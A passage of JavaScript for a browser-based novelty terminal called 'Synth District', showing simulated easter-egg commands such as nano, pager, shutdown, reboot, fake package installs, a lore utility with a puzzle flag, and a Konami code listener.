                                'e': () => { moveWord(1, true); cursorCol = Math.min(cursorCol, (lines[cursorLine]||'').length - 1); return { line: cursorLine, col: cursorCol }; },
                                'j': () => ({ line: Math.min(lines.length - 1, cursorLine + 1), col: cursorCol }),
                                'k': () => ({ line: Math.max(0, cursorLine - 1), col: cursorCol }),
                                '$': () => ({ line: cursorLine, col: Math.max(0, (lines[cursorLine]||'').length - 1) }),
                                '0': () => ({ line: cursorLine, col: 0 }),
                                '^': () => { const line = lines[cursorLine] || ''; const col = line.search(/\S/); return { line: cursorLine, col: col === -1 ? 0 : col }; }
                            };
                            yankOp(motions[key]); pendingOp = null;
                        }
                    }
                    e.preventDefault();
                }
                render();
            }

            document.addEventListener('keydown', onKey);
        });
    }

    /* ── nano overlay ── */
    async function nano(filepath, ctx) {
        return new Promise(resolve => {
            const fs = ctx.fs;
            let absPath = null, content = '';
            if (filepath) {
                absPath = fs.resolve(filepath);
                const existing = fs.readFile(absPath);
                content = existing || '';
            }
            const overlay = document.createElement('div');
            overlay.className = 'term-overlay';
            overlay.id = 'nano-overlay';
            overlay.innerHTML = `
<div class="nano-header"><span class="ansi-fg-bright-white ansi-bold"> GNU nano 7.2 &nbsp;&nbsp;&nbsp; ${filepath ? filepath : 'New Buffer'} </span></div>
<textarea class="nano-textarea" spellcheck="false">${esc(content)}</textarea>
<div class="nano-footer">
  <span><span class="nano-key">^X</span> Exit</span>
  <span><span class="nano-key">^O</span> Write Out</span>
  <span><span class="nano-key">^W</span> Where Is</span>
  <span><span class="nano-key">^K</span> Cut</span>
  <span><span class="nano-key">^U</span> Paste</span>
  <span><span class="nano-key">^G</span> Get Help</span>
  <span><span class="nano-key">^C</span> Cur Pos</span>
  <span><span class="nano-key">^Y</span> Prev Page</span>
  <span><span class="nano-key">^V</span> Next Page</span>
  <span><span class="nano-key">^\\</span> Replace</span>
</div>`;
            document.body.appendChild(overlay);
            const textarea = overlay.querySelector('.nano-textarea');
            textarea.focus();
            textarea.setSelectionRange(textarea.value.length, textarea.value.length);

            function doSave() {
                if (absPath) {
                    fs.writeFile(absPath, textarea.value);
                    return true;
                }
                return false;
            }

            textarea.addEventListener('keydown', (e) => {
                if (e.ctrlKey && e.key === 'x') {
                    e.preventDefault();
                    doSave();
                    overlay.remove();
                    resolve({ exitCode: 0 });
                } else if (e.ctrlKey && e.key === 'o') {
                    e.preventDefault();
                    if (doSave()) {
                        const hdr = overlay.querySelector('.nano-header span');
                        hdr.textContent = ` Wrote ${textarea.value.split('\n').length} lines — ${filepath} `;
                    }
                }
            });
        });
    }

    /* ── pager ── */
    async function pager(content, ctx) {
        return new Promise(resolve => {
            const overlay = document.createElement('div');
            overlay.className = 'term-overlay';
            overlay.id = 'pager-overlay';
            overlay.innerHTML = `
<div class="pager-body term-overlay-body">${esc(content)}</div>
<div class="term-overlay-footer"><span class="ansi-fg-bright-white">(END)</span> &nbsp; Press <span class="ansi-fg-yellow ansi-bold">q</span> to quit &nbsp; ↑↓ to scroll</div>`;
            document.body.appendChild(overlay);
            const body = overlay.querySelector('.pager-body');

            const onKey = (e) => {
                if (e.key === 'q' || e.key === 'Q') { overlay.remove(); document.removeEventListener('keydown', onKey); resolve({ exitCode: 0 }); }
                else if (e.key === 'ArrowDown' || e.key === 'j') body.scrollTop += 20;
                else if (e.key === 'ArrowUp' || e.key === 'k') body.scrollTop -= 20;
                else if (e.key === ' ' || e.key === 'PageDown') body.scrollTop += window.innerHeight - 40;
                else if (e.key === 'PageUp' || e.key === 'b') body.scrollTop -= window.innerHeight - 40;
                else if (e.key === 'g') body.scrollTop = 0;
                else if (e.key === 'G') body.scrollTop = body.scrollHeight;
                e.preventDefault();
            };
            setTimeout(() => document.addEventListener('keydown', onKey), 100);
        });
    }

    /* ── /dev/urandom ── */
    async function devUrandom(ctx) {
        const chars = '!@#$%^&*()_+-=[]{}|;:,.<>?ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        ctx.term.println(c('(binary output — press Ctrl+C to stop)', 'ansi-dim'));
        for (let i = 0; i < 5; i++) {
            await delay(200, ctx.signal);
            let line = '';
            for (let j = 0; j < 80; j++) line += chars[Math.floor(Math.random() * chars.length)];
            ctx.term.println(c(line, 'ansi-fg-yellow'));
        }
        await delay(400, ctx.signal);
        ctx.term.println(c('^C', 'ansi-fg-white'));
        return { exitCode: 130 };
    }

    /* ── touch grass ── */
    async function touchGrass(ctx) {
        const lines = [
            c('touch: cannot touch \'grass\': File not found', 'ansi-fg-red'),
            '',
            c('Hint: grass is not in the filesystem. It\'s outside.', 'ansi-fg-green'),
            c('Try: sudo go-outside', 'ansi-dim'),
        ];
        for (const l of lines) ctx.term.println(l);
        return { exitCode: 1 };
    }

    /* ── shutdown ── */
    async function shutdown(ctx) {
        const messages = [
            [0,   'ansi-fg-yellow', 'Broadcast message from root@synth-district (pts/0) (Mon Jan 15 09:00:00 2024):'],
            [100, 'ansi-fg-red ansi-bold', 'The system is going down for system halt NOW!'],
            [600, 'ansi-fg-white', 'Stopping nginx.service...'],
            [300, 'ansi-fg-green', '[ OK ] Stopped nginx.service.'],
            [200, 'ansi-fg-white', 'Stopping sshd.service...'],
            [300, 'ansi-fg-green', '[ OK ] Stopped sshd.service.'],
            [200, 'ansi-fg-white', 'Stopping cron.service...'],
            [200, 'ansi-fg-green', '[ OK ] Stopped cron.service.'],
            [300, 'ansi-fg-white', 'Unmounting filesystems...'],
            [400, 'ansi-fg-green', '[ OK ] Unmounted /home.'],
            [200, 'ansi-fg-green', '[ OK ] Unmounted /.'],
            [400, 'ansi-fg-yellow', 'Reached target System Halt.'],
            [600, 'ansi-fg-bright-white ansi-bold', 'Power down.'],
        ];
        for (const [wait, cls, msg] of messages) {
            await delay(wait, ctx.signal);
            ctx.term.println(c(msg, cls));
        }
        await delay(1000, ctx.signal);
        document.getElementById('terminal-container').style.opacity = '0';
        document.getElementById('terminal-container').style.transition = 'opacity 1s';
        await delay(1500, ctx.signal);
        document.getElementById('terminal-container').style.opacity = '1';
        document.getElementById('terminal-container').style.transition = '';
        ctx.term.println(c('Power failed. System restarting...', 'ansi-fg-yellow'));
        ctx.term.println(c('(This is a browser. You\'re stuck with us.)', 'ansi-dim'));
        return { exitCode: 0 };
    }

    /* ── reboot ── */
    async function reboot(ctx) {
        const messages = [
            [0,   'ansi-fg-yellow', 'Broadcast message from root@synth-district:'],
            [200, 'ansi-fg-red ansi-bold', 'The system is going down for reboot NOW!'],
            [400, 'ansi-fg-white', 'Stopping all services...'],
            [600, 'ansi-fg-green', '[ OK ] All services stopped.'],
            [400, 'ansi-fg-white', 'Syncing filesystems...'],
            [300, 'ansi-fg-green', '[ OK ] Sync complete.'],
            [400, 'ansi-fg-bright-white ansi-bold', 'Restarting...'],
        ];
        for (const [wait, cls, msg] of messages) {
            await delay(wait, ctx.signal);
            ctx.term.println(c(msg, cls));
        }
        await delay(800, ctx.signal);
        // BIOS POST screen
        const bios = document.createElement('div');
        bios.id = 'bios-overlay';
        bios.innerHTML = esc(`Synth District UEFI BIOS v2.3.1  Copyright (C) 2024 Synth Systems Inc.

CPU: Intel(R) Core(TM) i7-13700K @ 3.40GHz
Memory Test: ████████████████████████████████ 32768MB OK

Detecting drives...
  Disk 0: SynthDisk 256GB [OK]
  Disk 1: DataVault 500GB [OK]

Initializing boot devices...
  PCI: 00:00.0 Intel Host Bridge [OK]
  PCI: 00:02.0 Intel UHD Graphics 770 [OK]
  PCI: 01:00.0 NVIDIA RTX 4070 Ti [OK]
  PCI: 00:1f.3 Intel Audio [OK]

Booting from: /dev/sda1 (EXT4)
Loading kernel: vmlinuz-6.6.0-synth-district...`);
        document.body.appendChild(bios);
        await delay(2500, ctx.signal);
        bios.remove();
        location.reload();
        return { exitCode: 0 };
    }

    /* ── apt ── */
    async function apt(args, ctx) {
        const sub = args[0];
        const pkg = args.slice(1).join(' ');
        if (sub === 'update') {
            const repos = ['http://deb.debian.org/debian','http://security.debian.org','http://deb.debian.org/debian'];
            for (const r of repos) {
                await delay(200, ctx.signal);
                ctx.term.println(esc(`Get:${repos.indexOf(r)+1} ${r} bookworm InRelease [48.0 kB]`));
            }
            await delay(300, ctx.signal);
            ctx.term.println(c('Reading package lists... Done', 'ansi-fg-green'));
            ctx.term.println(esc('Building dependency tree... Done'));
            ctx.term.println(esc('Reading state information... Done'));
            ctx.term.println(esc(`${Math.floor(Math.random()*20+5)} packages can be upgraded. Run 'apt list --upgradable' to see them.`));
        } else if (sub === 'upgrade') {
            ctx.term.println(esc('Reading package lists... Done'));
            ctx.term.println(esc('Building dependency tree... Done'));
            const n = Math.floor(Math.random()*10+3);
            ctx.term.println(esc(`${n} upgraded, 0 newly installed, 0 to remove and 0 not upgraded.`));
            ctx.term.println(esc(`Need to get ${n*450} kB of archives.`));
            await delay(400, ctx.signal);
            ctx.term.println(c('Do you want to continue? [Y/n] Y', 'ansi-fg-yellow'));
            for (let i = 0; i < n; i++) {
                await delay(150, ctx.signal);
                const pkgs = ['curl','libssl3','openssl','nginx','systemd','libc6','bash','grep'];
                ctx.term.println(esc(`Get:${i+1} http://deb.debian.org/debian bookworm/main ${pkgs[i%pkgs.length]} 1.${i}.0 [${Math.floor(Math.random()*900+100)} kB]`));
            }
            await delay(300, ctx.signal);
            ctx.term.println(c('Setting up packages... Done', 'ansi-fg-green'));
        } else if (sub === 'install') {
            if (!pkg) { ctx.term.println(c('E: Unable to locate package', 'ansi-fg-red')); return { exitCode: 1 }; }
            ctx.term.println(esc(`Reading package lists... Done`));
            ctx.term.println(esc(`Building dependency tree... Done`));
            ctx.term.println(esc(`The following NEW packages will be installed:\n  ${pkg}`));
            ctx.term.println(esc(`0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.`));
            await delay(300, ctx.signal);
            ctx.term.println(c(`Get:1 http://deb.debian.org/debian bookworm/main ${pkg} 1.0.0 [${Math.floor(Math.random()*900+100)} kB]`, 'ansi-fg-cyan'));
            await delay(500, ctx.signal);
            ctx.term.println(c(`Setting up ${pkg} (1.0.0)...`, 'ansi-fg-green'));
            await delay(200, ctx.signal);
            ctx.term.println(c(`Processing triggers for man-db...`, 'ansi-dim'));
        } else {
            ctx.term.println(c('apt: command not recognized. Try: apt update, apt upgrade, apt install', 'ansi-fg-yellow'));
        }
        return { exitCode: 0 };
    }

    /* ── npm ── */
    async function npm(args, ctx) {
        const sub = args[0];
        const pkg = args.slice(1).join(' ');
        if (sub === 'install' || sub === 'i') {
            const pkgName = pkg || 'all packages';
            ctx.term.println(c(`npm warn deprecated lodash@3.0.0: Use lodash@4 instead.`, 'ansi-fg-yellow'));
            ctx.term.println(esc(`added ${Math.floor(Math.random()*500+50)} packages, and audited ${Math.floor(Math.random()*1000+500)} packages in ${(Math.random()*10+2).toFixed(0)}s`));
            ctx.term.println('');
            ctx.term.println(c(`${Math.floor(Math.random()*5)} packages are looking for funding`, 'ansi-fg-cyan'));
            ctx.term.println(c(`  run \`npm fund\` for details`, 'ansi-dim'));
            ctx.term.println('');
            ctx.term.println(c(`found 0 vulnerabilities`, 'ansi-fg-green'));
        } else if (sub === 'run') {
            ctx.term.println(esc(`> ${pkg}`));
            ctx.term.println('');
            ctx.term.println(c('(script output would appear here)', 'ansi-dim'));
        } else {
            ctx.term.println(c(`npm: unknown command: ${sub || '(none)'}`, 'ansi-fg-red'));
        }
        return { exitCode: 0 };
    }

    /* ── pip ── */
    async function pip(args, ctx) {
        const sub = args[0];
        const pkg = args.slice(1).join(' ');
        if (sub === 'install') {
            ctx.term.println(esc(`Collecting ${pkg}`));
            await delay(400, ctx.signal);
            ctx.term.println(esc(`  Downloading ${pkg}-1.0.0-py3-none-any.whl (${Math.floor(Math.random()*900+100)} kB)`));
            ctx.term.println(esc(`     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.0/${(Math.random()+0.5).toFixed(1)} MB ${(Math.random()*5+1).toFixed(1)} MB/s eta 0:00:00`));
            await delay(300, ctx.signal);
            ctx.term.println(c(`Installing collected packages: ${pkg}`, 'ansi-fg-green'));
            ctx.term.println(c(`Successfully installed ${pkg}-1.0.0`, 'ansi-fg-green'));
        } else {
            ctx.term.println(c(`pip: ${sub || 'no command specified'}`, 'ansi-fg-yellow'));
        }
        return { exitCode: 0 };
    }

    /* ── synth ── */
    async function synth(args, ctx) {
        if (args[0] === '--flag' && args[1]) {
            if (args[1] === 'c0ns0le_c0wboy_f0und_th3_s3cr3t') {
                ctx.term.println(c('🎉 Flag accepted! You are a true Console Cowboy.', 'ansi-fg-green ansi-bold'));
                ctx.term.println('');
                ctx.term.println(c('Welcome to the inner circle of Synth District.', 'ansi-fg-cyan'));
                ctx.term.println(c('There is more to explore. Check /etc/synth-district/config.', 'ansi-dim'));
            } else {
                ctx.term.println(c('synth: invalid flag', 'ansi-fg-red'));
            }
            return { exitCode: 0 };
        }
        if (args[0] === '--help' || args[0] === '-h') {
            ctx.term.println(c('synth — Synth District system utility', 'ansi-fg-cyan ansi-bold'));
            ctx.term.println(c('  synth --flag <FLAG>    Submit a found flag', 'ansi-fg-white'));
            ctx.term.println(c('  synth --lore           System lore', 'ansi-fg-white'));
            ctx.term.println(c('  synth --about          About this system', 'ansi-fg-white'));
            return { exitCode: 0 };
        }
        if (args[0] === '--lore') {
            const lore = [
                '',
                c('  SYNTH DISTRICT — THE NEON FRONTIER', 'ansi-fg-magenta ansi-bold'),
                '',
                c('  They built this system in the year when the last datacenter', 'ansi-fg-white'),
                c('  went dark. When the clouds turned to ash and the SaaS empires', 'ansi-fg-white'),
                c('  crumbled, one terminal remained lit.', 'ansi-fg-white'),
                '',
                c('  In Synth District, the terminal is law. The command line is', 'ansi-fg-cyan'),
                c('  the only interface that matters. Graphical UIs are myths told', 'ansi-fg-cyan'),
                c('  to frighten children.', 'ansi-fg-cyan'),
                '',
                c('  You are here now. The cursor blinks. It waits for you.', 'ansi-fg-green ansi-bold'),
                '',
                c('  (Type `help` to begin. Or don\'t. The terminal judges no one.)', 'ansi-dim'),
                '',
            ];
            lore.forEach(l => ctx.term.println(l));
            return { exitCode: 0 };
        }
        if (args[0] === '--about') {
            ctx.term.println(c('Synth District Linux 1.0 (Neon)', 'ansi-fg-cyan ansi-bold'));
            ctx.term.println(c('A terminal experience for those who prefer the command line.', 'ansi-fg-white'));
            ctx.term.println(c('Built with vanilla JS. No frameworks. No mercy.', 'ansi-dim'));
            return { exitCode: 0 };
        }
        // Default — show something cool
        ctx.term.println(c('SYNTH DISTRICT', 'ansi-fg-magenta ansi-bold'));
        ctx.term.println(c('The terminal awaits. What will you do?', 'ansi-fg-cyan'));
        ctx.term.println(c('Try: synth --lore  |  synth --help  |  synth --about', 'ansi-dim'));
        return { exitCode: 0 };
    }

    /* ── Konami code listener ── */
    const KONAMI = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a'];
    const keyBuf = [];
    document.addEventListener('keydown', (e) => {
        keyBuf.push(e.key);
        if (keyBuf.length > 10) keyBuf.shift();
        if (keyBuf.join(',') === KONAMI.join(',')) {
            const container = document.getElementById('terminal-container');
            if (container) {
                container.classList.add('konami');
                setTimeout(() => container.classList.remove('konami'), 3000);
                // try to print to terminal if available
                if (SD._term) {
                    SD._term.println(c('↑↑↓↓←→←→BA — Konami code activated! 🌈', 'ansi-fg-magenta ansi-bold'));
                }
            }
        }
    });

    SD.EasterEggs = {
        matrix, sl, hack, hackLoop, rmRf, neofetch, fortune, cowsay,
        nmap, top, vim, nano, pager, devUrandom, touchGrass,
        shutdown, reboot, apt, npm, pip, synth,
    };

})(window.SynthDistrict);
